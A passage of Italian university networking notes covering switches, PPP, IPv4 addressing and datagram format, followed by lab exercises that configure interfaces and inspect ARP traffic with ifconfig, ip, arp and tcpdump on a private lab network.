come un hub, inoltrando i pacchetti a tutte le porte!</p>
<ul>
<li><strong>paradigma cut-through</strong>: Il frame viene inoltrato all&rsquo;address
destinatario senza aspettare che il frame arrivi completamente.
Questo aumenta le prestazioni, ma permette meno funzionalità
(come l&rsquo;implementazione del controllo di integrità CRC, che
a volte è invece implementato in alcuni switch.);</li>
</ul>
<p><strong><code>Bridge</code></strong> (l2): implementa tutta la logica degli switch, ma con
alcune funzionalità aggiuntive.</p>
<ol>
<li>
<p><strong>Bridging trasparente</strong>: se si mettono in collegamento a livello
2 dei protocolli H2N differenti. Permette ad esempio l&rsquo;inoltro
di pacchetti tra protocollo ethernet e protocollo wi-fi.
Quindi il sistema di indirizzamento è lo stesso.</p>
</li>
<li>
<p><strong>Bridging non trasparente</strong>: in grado di lavorare con logiche
di &ldquo;conversione&rdquo; di protocolli di comuncazione. Sono molto
meno popolari.</p>
</li>
<li>
<p><strong>Bridging virtuale</strong>: switch che funzionano su interfacce
virtuali. Nonostante sia essenzialmente uno switch, viene
chiamato gergalmente &ldquo;bridge&rdquo;.</p>
</li>
</ol>
<p>Esistono anche dispositivi come gli <strong>splitter</strong>, molto economici e utili
per far partire due cavi da uno solo di ingresso.</p>
</li>
</ul>
<!-- raw HTML omitted -->
<ul>
<li>
<p>Interconnesioni di LAN</p>
<p>Una soluzione tipica per creare reti estese è quello di
creare delle reti LAN multi livello. Gli switch usati nei diversi
livelli possono anche essere di diversa natura, alcuni possono
essere più veloci di altri in base alle esigenze. Nel caso qui
presentato, lo switch centrale deve essere più potente degli altri.
Anche le singole porte degli switch possono reggere diverse velocità.</p>

  <figure class="left" >
    <img src="/ox-hugo/interconnessione.png"   />
    
      <figcaption class="center" ><span class="figure-number">Figure 6: </span>Rete Lan multilivello</figcaption>
    
  </figure>


<p>In una rete del genere, un guasto potrebbe impattare il funzionamento
di una grossa parte della rete. Per questo a volte si potrebbero
creare delle reti con percorsi ridondanti, in modo da dare percorsi
alternativi ai pacchetti.</p>
<ul>
<li>Problema: in presenza di reti <strong>cicliche</strong>, i messaggi broadcast circolano
all&rsquo;infinito!</li>
<li>Soluzione: <code>spanning tree protocol</code> &ndash;&gt; in una rete con dei collegamenti
ridondanti vengono disabilitati un certo numero di link sufficiente
a rimuovere i cicli! Quindi serve una &ldquo;logica&rdquo; che possa aiutare
a individuare questi cicli, usando dei messaggi sonda.</li>
</ul>
<p>Il problema del protocollo ARP rimane: i messaggi broadcast impallano
la rete!</p>
<hr>
</li>
</ul>
<h4 id="htn--interconnessioni-di-rete-e-accesso-a-internet">(HTN) INTERCONNESSIONI DI RETE E ACCESSO A INTERNET<a href="#htn--interconnessioni-di-rete-e-accesso-a-internet" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h4>
<p><a href="#table-of-contents"> &ndash;&gt; TOC</a></p>
<!-- raw HTML omitted -->
<ul>
<li>
<p>Intro</p>
<p><em>Ci avviamo verso il livello 3, ma senza abbandonare il livello 2&hellip;</em></p>
<p>Cerchiamo di capire come gestire reti <strong>indipendenti</strong> e <strong>eterogenee</strong>;
Internet è una <strong>rete globale</strong>: permette la comunicazione tra (<em>i</em>) dispositivi
e tra (<em>ii</em>) reti!
Lo scopo, alla fine, è quello di far comunicare in modo trasparente un <em>client</em>
e un <em>server</em>, che sono nodi della rete.
Internet può ad esempio essere visto come insieme di <strong>Autonomus Systems</strong>,
oppure un&rsquo;insieme di <strong>nomi</strong>.</p>
<p>Approfondimento sugli <strong>Autonomus System</strong></p>
<p>📃 <a href="https://theelandor.github.io/prova/reti/aut_system.html">Autonomus Systems (telegram)</a></p>
<p>Alcuni principi che bisogna seguire:</p>
<ul>
<li><strong>Survivability</strong> (<em>resilienza</em>): se tra due host esiste un percorso, la comunicazione tra
quei due host deve funzionare. Quindi ad esempio in caso di guasto di una via,
bisogna essere in grado di sfruttarne un&rsquo;altra.</li>
<li><strong>Forma a clessidra</strong>: IP implementa il minimo che serve per far funzionare
la rete globale. Le funzionalità aggiuntive vengono spartite negli altri
livelli dello stack \(\rightarrow\) IP è un protocollo <strong>non affidabile</strong>.</li>
<li><strong>Mancanza di stato</strong>: l&rsquo;intelligenza della rete è mantenuta sugli host e
non sui router. Questo è permesso grazie al <em>packet switching</em>: al contrario,
nelle reti telefoniche, l&rsquo;intelligenza era nella rete, mentre ai bordi i
dispositivi erano molto semplici (dispositivi elettro-meccanici).</li>
<li><strong>Net neutrality</strong>: ogni pacchetto deve essere gestito allo stesso modo,
indipendentemente dal tipo di dato o dal tipo di connessione ad esempio.
Questo principio, per motivi di varia natura, attualmente non è sempre
rispettato.</li>
</ul>
</li>
</ul>
<!-- raw HTML omitted -->
<ul>
<li>
<p>Connessioni xDSL</p>
<p>Metodo maggiormente utilizzato attualmente: il mio pc è collegato alla centrale
telefonica (cabina in strada), a sua volta collegata <strong>digitalmente</strong> alla rete
della compagnia telefonica corrispondente. Il <strong><code>Protocollo PPP</code></strong> è stato
appositamente pensato per collegamenti punto-punto nell&rsquo;accesso residenziale.</p>
</li>
</ul>
<!-- raw HTML omitted -->
<ul>
<li>
<p>PPP (approfondimento)</p>
<p>Protocollo(di livello 2) appositamente creato per la gestione dei collegamenti point-to-point,
ad esempio nelle connessioni cablate xDSL.</p>
<ol>
<li><strong>Modularità</strong>: supporta molti protocolli nei livelli superiori.</li>
<li>Supporto all'<strong>autenticazione</strong>: garanzia non scontata a livello di sicurezza!</li>
<li><strong>Rilevamento di errori</strong> (non risoluzione), molto importante in quasi ogni protocollo.</li>
<li>Supporto all'<strong>IP Dinamico</strong>:</li>
</ol>
<p><strong><code>Metodo di incapsulazione</code></strong>: PPP deve saper ricevere pacchetti di varia natura
e trasmetterli correttamente. 2 componenti principali: (<em>i</em>) Link Control Protocol e
(<em>ii</em>) Network Control Protocol</p>
<ul>
<li><strong>Link Control Protocol</strong> &ndash;&gt; relativa al mezzo fisico;</li>
<li><strong>Network Control Protocol</strong> &ndash;&gt; comunicazione con il livello IP;</li>
</ul>
<p><strong><code>Principi del PP</code></strong>:</p>
<ol>
<li><strong>Packet Framing</strong> con <strong>Bit transparency</strong>: il protocollo PPP deve riuscire a
trasferire dati binari di qualsiasi natura.</li>
<li><strong>Connection liveness</strong>: individua problemi a livello di link, nel caso viene
comunicato un errore a livello 3.</li>
<li><strong>Error detection</strong>, già accennato prima;</li>
<li><strong>Network Layer address negotiation</strong>: viene fornito supporto ai diversi
protocolli di rete comunicanti per configurare gli indirizzi di rete.
(&ldquo;Si configura il livello 3 a partire dal livello 2&rdquo;)</li>
</ol>
<p>Nonostante questo protocollo debba funzionare su dispositivi dedicati, è
abbastanza complesso e con molte funzionalità.
Alcune funzionalità di cui <strong>NON</strong> si occupa il PPP:</p>
<ol>
<li><strong>Error Correction</strong>;</li>
<li><strong>Flow Control</strong>: quando la connessione viene stabilita (ad esempio da casa
mia alla centralina), si stabilisce un &ldquo;tasso nominale&rdquo; di velocità che
però <em>non viene verificata</em> da parte di PPP. Questo non toglie che il
controllo non venga effettuato in altri livelli dello stack.</li>
<li><strong>Sequence</strong>: l&rsquo;ordine dei pacchetti non viene verificato.</li>
</ol>
<p><strong><code>Fasi principali di una connessione</code></strong></p>
<ol>
<li>Stabilire la <strong>connessione</strong>: quando intendo comunicare delle informazioni,
prima apro una connessione aprendo un canale. Si usa quindi un paradigma
diverso dal &ldquo;packet switching&rdquo;, dato che abbiamo un canale dedicato.</li>
<li><strong>Autenticazione</strong>, che in alcuni casi è facoltativa.</li>
<li><strong>Configurazione</strong> del protocollo di rete.</li>
<li>(fase di comunicazione)</li>
<li><strong>Terminazione</strong></li>
</ol>
<p>Dato che si usa un protocollo orientato alla connessione, si può suddividere
quest&rsquo;ultima in diverse fasi (Figura 6)</p>

  <figure class="left" >
    <img src="/ox-hugo/autome.png"   />
    
      <figcaption class="center" ><span class="figure-number">Figure 7: </span>PPP, automa a stati finiti</figcaption>
    
  </figure>


<p><strong><code>Data Frame del PPP</code></strong></p>

  <figure class="left" >
    <img src="/ox-hugo/pppframe.png"   />
    
      <figcaption class="center" ><span class="figure-number">Figure 8: </span>Frame del protocollo PPP</figcaption>
    
  </figure>


<p><strong><code>Byte Stuffing</code></strong></p>
<p>Tecnica che si usa per distinguere il byte &lt;01111110&gt; &ldquo;flag&rdquo; dallo
stesso byte se è un dato logico. Per farlo, aggiunge un byte extra analogo
prima di ogni byte (&lt;01111110&gt;) dato.
E' una sorta di operazione di &ldquo;escaping&rdquo;: il destinatario se trova due byte
(&lt;01111110&gt;) di fila, scarta il primo, il secondo lo considera &ldquo;dato&rdquo; e
continua la ricezione.</p>
<hr>
</li>
</ul>
<h4 id="ip--livello-ip">(IP) Livello IP<a href="#ip--livello-ip" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h4>
<p><a href="#table-of-contents"> &ndash;&gt; TOC</a></p>
<!-- raw HTML omitted -->
<ul>
<li>
<p>Indirizzo IP</p>
<p>32 bit &ndash;&gt; 4 byte, più piccolo di un&rsquo;indirizzo MAC!
Si usa una dotted notation, in cui ogni numero (in decimale) rappresenta
un byte. Indicativamente quindi si possono generare circa 4 miliardi di
indirizzi \((2^{32})\). In questo caso si parla di <strong><code>IPv4</code></strong>.</p>
<p>Per quando riguarda questo corso, studiamo degli indirizzi di <em>lunghezza fissa</em>,
indipendentemente dal contesto o tipo di comunicazioni. La lunghezza variabile
potrebbe permettere di avere più flessibilità, ma i costi a livello di comunicazione
sono troppo alti e svantaggiosi.</p>
<p>Lo spazio di indirizzamento è <strong>gerarchico</strong> e strutturato, a differenza ad
esempio di ethernet (ricordiamoci dei problemi legati ai messaggi ARP broadcast
che rischiano di intasare la rete). Le gerarchie fanno si che si possano
inviare i dati in modo selettivo in contesti anche complessi.</p>
<p>Gli indirzzi IP sono indirizzi <strong>logici</strong>, e possono essere:</p>
<ol>
<li>Assegnati a ogni host <strong>permanentemente</strong> (in modo statico);</li>
<li>Assegnati <strong>dinamicamente</strong>, ad esempio al momento del boot;</li>
</ol>
<p>Un classico esempio di un dispositivo che necessita di un indirizzo statico è un
server, che deve fornire un servizio permanente e accessibile.
Al contrario, noi utenti, spesso usiamo dei protocolli per ottenere l&rsquo;indirizzo dinamicamente.
Ovviamente, assegnamo l&rsquo;indirizzo IP ad un&rsquo;interfaccia di rete. Tuttavia, ogni interfaccia
può avere diversi indirizzi IP.</p>
<ul>
<li>Perchè c&rsquo;è bisogno anche di un indirizzo fisico oltre all&rsquo;indirizzo logico? &ndash;&gt; per
motivi di performance: in modo da poter &ldquo;delegare&rdquo; all&rsquo;hardware alcune funzionalità
specifiche (il filtraggio, ad esempio)! Queste stesse funzionalità potrebbero
anche essere gestite a più alto livello, ma potrebbero risultare più lente essendo
implementate a livello software.</li>
</ul>
</li>
</ul>
<!-- raw HTML omitted -->
<ul>
<li>
<p>Componenti dell&rsquo;Indirizzo IP</p>
<p>In questo caso i byte hanno un valore posizionale per garantire la
scalabilità e una struttura gerarchica:</p>
<ol>
<li>Network ID</li>
<li>Host ID</li>
</ol>
<p>Gli indirizzi IP sono gestiti per &ldquo;insiemi&rdquo;. Spesso indirizzi IP simili
corrispondono ad host vicini geograficamente e logicamente tra loro.</p>
</li>
</ul>
<!-- raw HTML omitted -->
<ul>
<li>
<p>Indirizzi IP <em>speciali</em></p>
<ul>
<li>
<p><strong><code>Network Address</code></strong>: <strong>155.185.0.0</strong> \(\rightarrow\)
la parte dell&rsquo;indirizzo relativa all&rsquo;host ha tutti i byte pari a 0.</p>
</li>
<li>
<p><strong><code>Indirizzo di Broadcast</code></strong>: <strong>128.211.255.255</strong> \(\rightarrow\) la parte dell&rsquo;indirizzo
relativa all&rsquo;host ha tutti i byte con bit pari a 1. Questo messaggio può
essere destinato ad una qualsiasi rete.</p>
</li>
<li>
<p><strong><code>Limited Broadcast Adress</code></strong>: <strong>255.255.255.255</strong> \(\rightarrow\) tutti i bit settati a 1.
Permette di mandadre un messaggio broadcast sulla rete fisica locale.
Un pacchetto con questo indirizzo IP <em>non viene</em> inoltrato dai router, perchè
è destinato soltanto alla rete locale, è simile ad un arp request.</p>
</li>
<li>
<p><strong><code>This Host on This Network</code></strong>: 0.0.0.0 \(\rightarrow\) tutti i bit settati a 0. Identifica
un host non ancora configurato correttamente.</p>
</li>
<li>
<p><strong><code>Loopback Address</code></strong>: <strong>127.0.0.1</strong> \(\rightarrow\) permette la comunicazione a livello internet
sulla stessa macchina, localmente. <em>Tutti gli indirizzi di loopback iniziano per 127</em>!</p>
</li>
<li>
<p><strong><code>Indirizzi privati</code></strong> ammissibili: indirizzi <em>non routable</em>, che possono
essere usati localmente senza autorizzazione.
(<em>i</em>) 10.0.0.0/8
(<em>ii</em>) 172.16.0.0/12
(<em>iii</em>) 192.168.0.0/16</p>
</li>
</ul>
<p><strong><code>Natting</code></strong> &ndash;&gt; se ho una rete privata ma voglio comunicare con una rete
esterna, che magari non accetta gli indirizzi IP locali. E' una funzione
offerta dal router locale.
📃 <a href="https://theelandor.github.io/prova/reti/ip_header_nat.html">Approfondimento Natting</a></p>
</li>
</ul>
<!-- raw HTML omitted -->
<ul>
<li>
<p>Gestione indirizzi e domini</p>
<p><strong><code>Jon Postel</code></strong> [1943-1998]: definito <em>lo zar dei numeri</em>, direttore di <strong>IANA</strong>, si occupava
di garantire gli standard di internet.
Uno dei compiti di IANA, era quello di garantire la corretta gestione degli indirizzi IP,
la loro unicità e la loro corretta struttura gerarchica.
Data la decentralizzazione di internet, la IANA cerca di delegare i compiti ai
provider di internet internazionali. Per prima cosa, si creano delle sotto-associazioni
che gestiscono dei &ldquo;blocchi&rdquo; di indirizzi IP, a livello geografico (quindi &ldquo;asegnando&rdquo;
i <em>Network ID</em>). A loro volta verrano istituiti dei provider nazionali, regionali,
e così via.</p>
<p><strong><code>Classi di Indirizzi IP</code></strong>: differenziano il numero di byte assegnati al netid.
Per classificarli e riconoscerli, hanno delle sequenze iniziali distintive. Ad
esempio, gli indirizzi che iniziano con 10 sono di classe B, quindi hanno i primi
2 byte dedicati al netid. Quelli di classe C i primi 3 byte, ecc&hellip;
Le 3 classi più interessanti, che tratteremo in questo corso, sono A,B,C.</p>

  <figure class="left" >
    <img src="/ox-hugo/classi.png"   />
    
      <figcaption class="center" ><span class="figure-number">Figure 9: </span>Classi di Indirizzi IP</figcaption>
    
  </figure>



  <figure class="left" >
    <img src="/ox-hugo/classi2.png"   />
    
      <figcaption class="center" ><span class="figure-number">Figure 10: </span>Dimensioni delle classi di indirizzi</figcaption>
    
  </figure>


<p>Queste classi di indirizzi erano pensate per essere assegnate ai diversi internet service
provider. Ovviamente, negli anni sono entrati in scena aspetti economico/politici:
gli ISP comprano una determinata classe in base al bisogno di connettività che devono
fornire ai loro utenti.</p>
<p>Tendenzialmente i gestori di classi A sono grossi paesi o grosse aziende (<em>o ricche</em>, <del>che a volte
nemmeno ne hanno bisogno</del> ) come Apple, IBM, IANA, e altre.</p>
<p><strong><code>Indirizzi Classless</code></strong>: per motivi gestionali e di flessibilità, spesso si può indicare esplicitamente
quale parte dell&rsquo;indirizzo è dedicata al N.ID o H.ID.
Per fare questo tipo di ripartizione, si usa la notazione <strong><code>CIDR</code></strong> \(\rightarrow\) <strong>a.b.c.d/n</strong></p>
<p>Esempio di indirizzo classless: 192.168.1.1/23</p>
</li>
</ul>
<!-- raw HTML omitted -->
<ul>
<li>
<p>Formato del datagramma IP</p>
<p>Ogni pacchetto IP può essere lungo fino a 64kbyte. Sicuramente
nell&rsquo;header sono contenuti (<em>i</em>) indirizzo sorgente (<em>ii</em>) indirizzo
destinazione.
Se si pensa all&rsquo;interità dello stack, ci si ricorda che questo pacchetto
verrà passato ai livelli sottostanti prima di essere trasmesso, quindi
al livello ethernet. La grandezza massima del frame ethernet era determinata
dall&rsquo;M.C.U: in ogni caso non poteva superare i 1500byte. Come faccio
quindi a incapsulare un pacchetto grande fino a 64KByte?</p>
<p>&ndash;&gt; Esistono 2 approcci per risolvere questo problema:</p>
<ol>
<li>Faccio in modo che questo pacchetto IP sia più piccolo e possa
essere incapsulato;</li>
<li>Si cerca di <strong>frammentare</strong> il datagramma IP, quindi bisogna fornire
delle informazioni all&rsquo;interno del datagramma che possano servire
all&rsquo;host che riceve il frammento per &ldquo;ricostruire&rdquo; l&rsquo;intero pacchetto.</li>
</ol>

  <figure class="left" >
    <img src="/ox-hugo/ipdatagram.png"   />
    
      <figcaption class="center" ><span class="figure-number">Figure 11: </span>Formato del datagram IP</figcaption>
    
  </figure>


<ul>
<li><strong>VERS</strong> &ndash;&gt; informazioni sulla versione;</li>
<li><strong>HLEN</strong> &ndash;&gt; lunghezza dell&rsquo;header del datagram, si suppone una certa
flessibilità del protocollo.</li>
<li><strong>Service type</strong> &ndash;&gt; bitmap che comunica delle informazioni relativi
al pacchetto. In Figura 11 si può vedere meglio la struttura di questa
sequenza lunga 8 bit.</li>
<li><strong>Identification</strong> &ndash;&gt; intero che identifica il datagram;</li>
<li><strong>Flags</strong> &ndash;&gt; flag che segnalano la frammentazione;</li>
<li><strong>Offset</strong> &ndash;&gt; identificano il frammento rispetto al pacchetto originale;</li>
<li><strong>Time to Live</strong> &ndash;&gt; contatore che ci mostra quanti router questo pacchetto
può percorrere prima di essere scartato.</li>
<li><strong>Protocol</strong> &ndash;&gt; contiene informazioni verso il livello 4, indica quale
protocollo può usare i dati contenuti nel datagram.</li>
<li><strong>Checksum</strong> &ndash;&gt; controllo di integrità sull'<em>header</em>, quindi non ci si
preoccupa per ora del payload. (Come al solito, in IP ci si mantiene
il più leggeri possibili).</li>
<li><strong>Ip-options</strong> &ndash;&gt; campo opzionale di grandezza variabile, serve per fare
debugging di rete.</li>
<li><strong>Padding</strong> &ndash;&gt; serve per fare in modo che l&rsquo;intero header abbia lunghezza
che sia un multiplo di 32 bit. Simile al &ldquo;byte stuffing&rdquo;.</li>
</ul>

  <figure class="left" >
    <img src="/ox-hugo/typeofs.png"   />
    
      <figcaption class="center" ><span class="figure-number">Figure 12: </span>Service type sequence</figcaption>
    
  </figure>


</li>
</ul>
<h4 id="ip--ip-routing">(IP) Ip routing<a href="#ip--ip-routing" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h4>
<ul>
<li>📃 <a href="https://theelandor.github.io/prova/reti/ip_routing.html">IP routing</a></li>
<li>📃 <a href="https://theelandor.github.io/prova/reti/ip_routing_2.html">IP routing, p2</a></li>
</ul>
<hr>
<h4 id="lab-6-10">Lab 6-10<a href="#lab-6-10" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h4>
<p><a href="#table-of-contents"> &ndash;&gt; TOC</a></p>
<ul>
<li><strong><code>Collegamenti dritti</code></strong>: si usano quando si vogliono collegare
dispositivi che lavorano a livelli diversi dello stack TCP/IP,
come un host e uno switch.</li>
<li><strong><code>Collegamenti incrociati</code></strong>: quando si collegano dispositivi
che lavorano allo stesso livello dello stack TCP/IP, come
due host o due switch.</li>
</ul>
<!-- raw HTML omitted -->
<ul>
<li>
<p>ifconfig</p>
<p>Si usa il comando <strong>ifconfig</strong> per mostrare le interfacce attualmente
<em>attive</em> nell&rsquo;host.
Alcune flag/opzioni utili:</p>
<ul>
<li>
<p><strong>-a</strong>: mostra tutte le interfacce, anche le non attive. (i) <strong>lo</strong> è
un&rsquo;interfaccia virtuale locale che il SO usa per le comunicazioni
tra processi locali.</p>
</li>
<li>
<p><strong>&lt;nome_interfaccia&gt;</strong>: mostra le informazioni sull&rsquo;interfaccia specificata;
(i) HWaddr è il MAC adress dell&rsquo;interfaccia;
(ii) MTU è la maximum transfer unit;</p>
</li>
</ul>
</li>
</ul>
<!-- raw HTML omitted -->
<ul>
<li>
<p>ip</p>
<p>Si usa il comando <strong>ip</strong> per interagire con lo stack TCP/IP. Per lavorare
a livello 2 si usa il comando <strong>ip link</strong>. Esso elenca tutte le interfacce
di rete disponibili nel sistema, simile al comando <code>ifconfig -a</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">eros@eros-ThinkPad-T430:~/website$ ip link
1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu <span style="color:#ae81ff">65536</span> qdisc noqueue state UNKNOWN mode DEFAULT group default qlen <span style="color:#ae81ff">1000</span>
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
2: enp0s25: &lt;NO-CARRIER,BROADCAST,MULTICAST,UP&gt; mtu <span style="color:#ae81ff">1500</span> qdisc fq_codel state DOWN mode DEFAULT group default qlen <span style="color:#ae81ff">1000</span>
    link/ether 28:d2:44:0e:4e:f4 brd ff:ff:ff:ff:ff:ff
3: wlp3s0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu <span style="color:#ae81ff">1500</span> qdisc mq state UP mode DORMANT group default qlen <span style="color:#ae81ff">1000</span>
    link/ether 6c:88:14:86:08:08 brd ff:ff:ff:ff:ff:ff
4: docker0: &lt;NO-CARRIER,BROADCAST,MULTICAST,UP&gt; mtu <span style="color:#ae81ff">1500</span> qdisc noqueue state DOWN mode DEFAULT group default
    link/ether 02:42:f5:40:4e:45 brd ff:ff:ff:ff:ff:ff
</code></pre></div><ul>
<li><strong>ip link show eth0</strong> per ottenere informazioni su quell&rsquo;interfaccia di rete;</li>
<li><strong>ip link set eth0 up</strong> per accendere l&rsquo;interfaccia;</li>
<li><strong>ip link set eth0 down</strong> per spegnere l&rsquo;interfaccia;</li>
</ul>
</li>
</ul>
<!-- raw HTML omitted -->
<ul>
<li>
<p>Come configurare una rete</p>
<ol>
<li>
<p>Per prima cosa bisogna assegnare l&rsquo;indirizzo IP all&rsquo;interfaccia.
Eseguire questo comando corrisponde anche all&rsquo;accensione dell&rsquo;interfaccia.
Dopo l&rsquo;esecuzione del comando, sull&rsquo;output di ifconfig compare la
linea corrispondente alle informazioni degli indirizzi ip.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ifconfig eth0 192.168.1.1
</code></pre></div><p>Per spegnere l&rsquo;interfaccia e rimuovere l&rsquo;indirizzo ip:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ifconfig eth0 <span style="color:#ae81ff">0</span> down
</code></pre></div><p>Per vedere gli indirizzi assegnati ad un interfaccia:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ip addr show dev eth0
ifconfig eth0
</code></pre></div><p>Per aggiungere un indirizzo ip  ad un interfaccia.
In questo caso devo sia assegnare l&rsquo;indirizzo che attivare l&rsquo;interfaccia.
ifconfig invece lo fa in automatico, per questo a volte risulta più comodo.
Il comando ip è pensato per gestire più indirizzi IP in una stessa
interfaccia, quindi risulta più articolato.
Usando il comando <code>ifconfig eth0 0 down</code> viene spenta l&rsquo;interfaccia
e rimosso soltanto <em>il primo</em> indirizzo ip.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ip addr add dev eth0 192.168.1.1/24
</code></pre></div></li>
<li>
<p>Dopo aver acceso le interfacce e aver assegnato l&rsquo;indirizzo IP,
si può testare la connessione usando <code>ping</code>. Se questa operazione
ha successo, si può consultare l'<em>arp table</em> usando uno di questi
due comandi:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@m1:~# arp
Address                  HWtype  HWaddress           Flags Mask            Iface
192.168.1.4              ether   02:04:06:1b:57:4b   C                     eth0
192.168.1.3                      <span style="color:#f92672">(</span>incomplete<span style="color:#f92672">)</span>                              eth0

root@m1:~# ip neigh
192.168.1.4 dev eth0 lladdr 02:04:06:1b:57:4b STALE
192.168.1.3 dev eth0  FAILED
</code></pre></div><p>Può tornare utile il comando <code>ip neigh flush all</code>, che pulisce
l&rsquo;arp table.</p>
</li>
<li>
<p><strong>ifupdown</strong> &ndash;&gt; tool che serve per configurare in modo permanente
la configurazione di una macchina. Prima di agire, conviene resettare
le configurazioni temporanee.</p>
<p>La configurazione è contenuta nel file /etc/network/interfaces.
In questo modo le informazioni date configurano la rete come
se fosse stato usato ifconfig. Ecco un semplice esempio di
configurazione</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@m2:~# cat /etc/network/interfaces
<span style="color:#75715e"># interfaces(5) file used by ifup(8) and ifdown(8)</span>
<span style="color:#75715e"># Include files from /etc/network/interfaces.d:</span>
source-directory /etc/network/interfaces.d

auto eth0

iface eth0 inet static
address 192.168.1.1
</code></pre></div><ul>
<li>auto &ndash;&gt; la configurazione si attiva al boot;</li>
<li>per attivare immediatamente la configurazione dell&rsquo;interfaccia
di eth0 si può usare il comando <code>ifup eth0</code> ;</li>
<li>per disattivare la configurazione permanente dell&rsquo;interfaccia
di eth0 si usa <code>ifdown eth0</code>;</li>
</ul>
</li>
</ol>
</li>
</ul>
<!-- raw HTML omitted -->
<ul>
<li>
<p>TMUX</p>
<p>Alcuni comandi utili per la gestione delle finestre:</p>
<pre tabindex="0"><code class="language-example" data-lang="example">- logout --&gt; ctrl-d
- modalità comandi --&gt; ctrl-b
- detach --&gt; CMD + d
- split verticale --&gt; CMD + %
- split orizzontale --&gt; CMD + &quot;
- spostamento --&gt; CMD + freccina
- scroll --&gt; CMD + pageup/pagedown
- nuova finestra --&gt; CMD + c
- scelta finestra --&gt; CMD + numero
</code></pre></li>
</ul>
<!-- raw HTML omitted -->
<ul>
<li>
<p>tcpdump e ping</p>
<p>Tool usato per sniffare il traffico di rete di una determinata scheda.
(i) -e sta per ethernet, in modo da limitarsi alle informazioni del livello 2.
(ii) -i serve per specificare l&rsquo;interfaccia.
Esempio di output:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@m2:~# tcpdump -nei eth0
tcpdump: verbose output suppressed, use -v or -vv <span style="color:#66d9ef">for</span> full protocol decode
listening on eth0, link-type EN10MB <span style="color:#f92672">(</span>Ethernet<span style="color:#f92672">)</span>, capture size <span style="color:#ae81ff">262144</span> bytes
10:53:49.007880 02:04:06:9c:eb:4a &gt; ff:ff:ff:ff:ff:ff, ethertype ARP <span style="color:#f92672">(</span>0x0806<span style="color:#f92672">)</span>, length 42: Request who-has 192.168.1.2 tell 192.168.1.1, length <span style="color:#ae81ff">28</span>
10:53:49.007905 02:04:06:1b:57:4b &gt; 02:04:06:9c:eb:4a, ethertype ARP <span style="color:#f92672">(</span>0x0806<span style="color:#f92672">)</span>, length 42: Reply 192.168.1.2 is-at 02:04:06:1b:57:4b, length <span style="color:#ae81ff">2</span>
</code></pre></div><p>Può essere utile anche il comando <code>arping</code>: il test di connessione
viene effettuato mandando tante richieste ARP, consecutivamente.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@m1:~# arping -i eth0 192.168.1.2
root@m2:~# tcpdump -nei eth0
tcpdump: verbose output suppressed, use -v or -vv <span style="color:#66d9ef">for</span> full protocol decode
listening on eth0, link-type EN10MB <span style="color:#f92672">(</span>Ethernet<span style="color:#f92672">)</span>, capture size <span style="color:#ae81ff">262144</span> bytes
10:56:56.242261 02:04:06:9c:eb:4a &gt; ff:ff:ff:ff:ff:ff, ethertype ARP <span style="color:#f92672">(</span>0x0806<span style="color:#f92672">)</span>, length 42: Request who-has 192.168.1.2 tell 192.168.1.1, length <span style="color:#ae81ff">28</span>
10:56:56.242283 02:04:06:1b:57:4b &gt; 02:04:06:9c:eb:4a, ethertype ARP <span style="color:#f92672">(</span>0x0806<span style="color:#f92672">)</span>, length 42: Reply 192.168.1.2 is-at 02:04:06:1b:57:4b, length <span style="color:#ae81ff">28</span>
</code></pre></div><hr>
</li>
</ul>
<h4 id="lab-20-10">Lab 20-10<a href="#lab-20-10" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h4>
<p><a href="#table-of-contents"> &ndash;&gt; TOC</a></p>
<!-- raw HTML omitted -->
<ul>
<li>
<p>Introduzione</p>
<p>Lo scopo è quello di configurare 2 reti locali separate, con un host
centrale che fa da router.</p>

  <figure class="left" >
    <img src="/ox-hugo/router.png"   />
    
  </figure>


<p><strong>LAN1: 192.168.1.0</strong>
Quindi gli indirizzi ip vanno da 192.168.1.1 a 192.168.1.254, perchè
192.168.1.255 è un&rsquo;indirizzo speciale non assegnabile (di broadcast);</p>
<p><strong>LAN2: 192.168.2.0</strong></p>
</li>
</ul>
<!-- raw HTML omitted -->
<ul>
<li>
<p>Configurazione (temporanea)</p>
<ul>
<li><strong>H1</strong> &ndash;&gt; <code>ifconfig eth0 192.168.1.1/24</code>. Per essere sicuri, è meglio specificare la netmask;</li>
</ul>
<p>Il router H2 ha due interfacce di rete, vanno configurate entrambe:</p>
<ul>
<li><strong>H2</strong> &ndash;&gt; <code>ifconfig eth0 192.168.1.254/24</code>
<code>ifconfig eth1 192.168.2.254/24</code></li>
</ul>
<p>Dato che H2 è il router, deve avere le due interfacce che appartengono alle
due reti diverse. E' prassi che il suo indirizzo IP parta dagli ultimi
disponibili, in modo da essere riconoscibile ad occhio.</p>
</li>
</ul>
